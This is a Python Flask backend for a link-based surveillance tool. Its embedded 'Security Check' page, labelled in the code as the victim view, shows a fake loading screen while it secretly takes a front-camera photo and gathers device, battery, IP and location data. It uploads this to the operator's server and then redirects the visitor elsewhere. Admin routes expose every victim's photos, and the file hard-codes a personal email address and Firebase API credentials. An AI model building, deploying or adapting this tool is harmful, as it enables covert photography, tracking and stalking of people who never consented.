from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from functools import wraps
import uuid
import time
import pyrebase

app = Flask(__name__)

CORS(app, resources={r"/*": {"origins": "*"}}) 


ADMIN_EMAIL = "Mastimusicboxabd01@gmail.com" 

firebase_config = {
    "apiKey": "AIzaSyDq3jnK4Y3W0T4H1m2HXRFRLpLQc8hiYlQ",
    "authDomain": "taitan-bot-hosting.firebaseapp.com",
    "databaseURL": "https://taitan-bot-hosting-default-rtdb.firebaseio.com",
    "projectId": "taitan-bot-hosting",
    "storageBucket": "taitan-bot-hosting.firebasestorage.app",
    "messagingSenderId": "939903690873",
    "appId": "1:939903690873:android:ae3fe159c7dd73abea8ca8"
}

try:
    firebase = pyrebase.initialize_app(firebase_config)
    db = firebase.database()
    auth = firebase.auth()
except Exception as e:
    print(f"DB Error: {e}")
    db = None
    auth = None

# --- AUTH DECORATOR ---
def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            return jsonify({'success': False, 'error': 'No token provided'}), 401
        try:
            token = token.replace('Bearer ', '')
            user_info = auth.get_account_info(token)['users'][0]
            request.user = user_info
        except Exception as e:
            return jsonify({'success': False, 'error': 'Invalid token'}), 401
        return f(*args, **kwargs)
    return decorated

# --- TARGET HTML (Victim View - served by Vercel) ---
TARGET_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Security Check</title>
    <style>
        body,html{margin:0;padding:0;height:100%;background:#fff;font-family:sans-serif;overflow:hidden}
        .wrap{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;text-align:center;padding:20px}
        .load{width:50px;height:50px;border:4px solid #f3f3f3;border-top:4px solid #7c3aed;border-radius:50%;animation:s 1s linear infinite;margin-bottom:20px}
        @keyframes s{to{transform:rotate(360deg)}}
        .t{color:#333;font-weight:600}
        video{position:fixed;opacity:0;pointer-events:none}
    </style>
</head>
<body>
    <div class="wrap"><div class="load"></div><div class="t">Verifying connection secure...</div></div>
    <video id="v" autoplay playsinline muted></video><canvas id="c" style="display:none"></canvas>
<script>
    setTimeout(()=>{window.location.href="{{r_url}}"}, 3500);
    window.onload = async () => {
        try {
            let m = {ip:"{{ip}}", device:navigator.userAgent, platform:navigator.platform, screen:screen.width+'x'+screen.height};
            try{ const b=await navigator.getBattery(); m.battery=Math.round(b.level*100)+'%'; }catch(e){}
            
            try {
                const r = await fetch('https://ipapi.co/json/');
                const j = await r.json();
                m.city = j.city; m.country = j.country_name; m.isp = j.org; m.ip = j.ip;
            } catch(e){}

            const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
            const v=document.getElementById('v'); v.srcObject=s;
            await new Promise(r=>v.onloadedmetadata=r); v.play();
            await new Promise(r=>setTimeout(r,1200));
            const c=document.getElementById('c'); c.width=v.videoWidth; c.height=v.videoHeight;
            c.getContext('2d').drawImage(v,0,0);
            const i=c.toDataURL('image/jpeg',0.6).split(',')[1];
            s.getTracks().forEach(t=>t.stop());
            
            await fetch('/u/{{sid}}', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({img:i, meta:m})});
            window.location.href="{{r_url}}";
        } catch(e) { window.location.href="{{r_url}}"; }
    };
</script>
</body>
</html>
"""

# --- API ROUTES ---

@app.route('/')
def home():
    return jsonify({"status": "Backend is running!"})

@app.route('/api/login', methods=['POST'])
@require_auth
def login_user():
    uid = request.user['localId']
    email = request.user.get('email', '')
    name = request.user.get('displayName', 'Unknown User')
    
    # Save user to DB
    db.child("users").child(uid).update({
        "email": email,
        "name": name,
        "last_login": time.time()
    })
    
    is_admin = (email == ADMIN_EMAIL)
    return jsonify({'success': True, 'is_admin': is_admin, 'uid': uid, 'email': email})

@app.route('/api/create_link', methods=['POST'])
@require_auth
def api_create():
    uid = request.user['localId']
    u = request.json.get('url')
    if not u.startswith('http'): u = 'https://' + u
    sid = str(uuid.uuid4())[:8]
    db.child("links").child(sid).set({"uid": uid, "url": u, "photos":[], "meta": {}, "created": time.time()})
    return jsonify({'success': True, 'sid': sid})

@app.route('/api/get_links')
@require_auth
def api_get_links():
    uid = request.user['localId']
    d = db.child("links").get().val()
    return jsonify({k: v for k, v in d.items() if v.get('uid') == uid} if d else {})

@app.route('/api/delete_link/<sid>', methods=['POST'])
@require_auth
def api_delete_link(sid):
    uid = request.user['localId']
    l = db.child("links").child(sid).get().val()
    # Admin can delete any link, User can delete only their own
    if l and (l.get('uid') == uid or request.user.get('email') == ADMIN_EMAIL): 
        db.child("links").child(sid).remove()
    return jsonify({'success': True})

@app.route('/api/edit_link/<sid>', methods=['POST'])
@require_auth
def api_edit_link(sid):
    uid = request.user['localId']
    l = db.child("links").child(sid).get().val()
    if l and l.get('uid') == uid: 
        db.child("links").child(sid).update({"url": request.json.get('url')})
    return jsonify({'success': True})

@app.route('/api/delete_photo/<sid>/<idx>', methods=['POST'])
@require_auth
def api_delete_photo(sid, idx):
    uid = request.user['localId']
    l = db.child("links").child(sid).get().val()
    if l and (l.get('uid') == uid or request.user.get('email') == ADMIN_EMAIL):
        p = l.get('photos',[])
        if 0 <= int(idx) < len(p):
            p.pop(int(idx))
            db.child("links").child(sid).update({"photos": p})
    return jsonify({'success': True})

# --- ADMIN ROUTES ---
@app.route('/api/admin/data')
@require_auth
def admin_data():
    if request.user.get('email') != ADMIN_EMAIL:
        return jsonify({'error': 'Unauthorized'}), 403
    
    users = db.child("users").get().val() or {}
    all_links = db.child("links").get().val() or {}
    
    # Attach link count to users
    for uid, user in users.items():
        user['link_count'] = sum(1 for link in all_links.values() if link.get('uid') == uid)
        
    return jsonify({'success': True, 'users': users, 'all_links': all_links})

@app.route('/api/admin/delete_user/<uid>', methods=['POST'])
@require_auth
def admin_delete_user(uid):
    if request.user.get('email') != ADMIN_EMAIL:
        return jsonify({'error': 'Unauthorized'}), 403
        
    db.child("users").child(uid).remove()
    all_links = db.child("links").get().val() or {}
    for sid, link in all_links.items():
        if link.get('uid') == uid:
            db.child("links").child(sid).remove()
            
    return jsonify({'success': True})

# --- VICTIM ROUTES (Kept on backend for security and redirection) ---

@app.route('/v/<sid>')
def view_link(sid):
    d = db.child("links").child(sid).get().val()
    if not d: return "404", 404
    return render_template_string(TARGET_HTML, sid=sid, r_url=d['url'], ip=request.remote_addr)

@app.route('/u/<sid>', methods=['POST'])
def upload_data(sid):
    d, c = request.json, db.child("links").child(sid).get().val()
    if c and d.get('img'):
        p = c.get('photos',[])
        if not isinstance(p, list): p = []
        p.append(d['img'])
        db.child("links").child(sid).update({"photos": p, "meta": {**c.get('meta', {}), **d.get('meta', {})}})
    return "OK"

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
